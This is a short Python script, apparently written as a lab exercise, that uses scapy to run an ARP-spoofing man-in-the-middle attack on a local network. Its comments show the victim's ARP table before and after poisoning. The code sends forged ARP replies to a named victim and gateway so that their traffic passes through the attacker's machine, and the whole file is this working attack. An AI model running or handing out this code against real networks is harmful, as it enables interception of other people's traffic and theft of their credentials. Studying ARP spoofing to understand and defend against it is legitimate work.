#!/usr/local/bin/python

'''
ARP MitM
'''

# Good overview of ARP Spoofing
# https://toschprod.wordpress.com/2012/01/20/mitm-3-arp-spoofing/
# Review the table at the bottom, create ARP packets w/ the appropriate SPA, THA, and TPA values.
# SHA value will be automatically by scapy

# arp -a will display your arp table
# arp -ad will clear your arp table (useful to do on your victim's machine)

### BEFORE (gateway and attacker hw address are the different) ####
# $  sudo arp -a
# ? (192.168.1.1) at d8:50:e6:59:93:a8 on en0 ifscope [ethernet]
# ? (192.168.1.4) at a8:20:66:35:37:96 on en0 ifscope permanent [ethernet]
# ? (192.168.1.223) at 8:0:27:a:8f:1b on en0 ifscope [ethernet]

### AFTER (gateway and attacker hw address are the same) ### 
# $  sudo arp -a
# ? (192.168.1.1) at 8:0:27:a:8f:1b on en0 ifscope [ethernet]
# ? (192.168.1.4) at a8:20:66:35:37:96 on en0 ifscope permanent [ethernet]
# ? (192.168.1.223) at 8:0:27:a:8f:1b on en0 ifscope [ethernet]


from scapy.all import *

attacker = ("192.168.1.223", "08:00:27:a:8f:1b")
victim = ("192.168.1.4", "a8:20:66:35:37:96 ")
gateway = ("192.168.1.1", "d8:50:e6:59:93:a8")

def ARP_MitM(pkt):
    # opcode 2 is 'reply'
    # https://www.iana.org/assignments/arp-parameters/arp-parameters.xhtml#arp-parameters-1
    spoof_victim = ARP(op=2, psrc=gateway[0], pdst=victim[0], hwdst=victim[1])
    spoof_gateway = ARP(op=2, psrc=victim[0], pdst=gateway[0], hwdst=gateway[1])

    send(spoof_victim)#, verbose=0)
    send(spoof_gateway)#, verbose=0)

# Filter anything that isn't 
sniff(iface="enp0s3", prn=ARP_MitM, filter="arp and host {} or host {}".format(gateway[0], victim[0]), count=10, store=0)